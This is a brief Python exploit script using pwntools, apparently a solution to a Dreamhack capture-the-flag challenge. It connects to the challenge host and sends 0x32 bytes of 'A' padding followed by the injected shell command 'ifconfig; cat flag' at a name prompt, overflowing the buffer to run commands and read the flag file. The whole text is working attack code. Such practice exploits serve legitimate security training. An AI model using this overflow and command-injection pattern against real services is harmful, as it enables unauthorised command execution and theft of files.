from pwn import *

p = remote("host2.dreamhack.games",21196)

hello = b"A"*0x32

p.sendlineafter(b"Center name: ", hello+b"ifconfig; cat flag")

print(p.recvall().decode("utf-8")) 
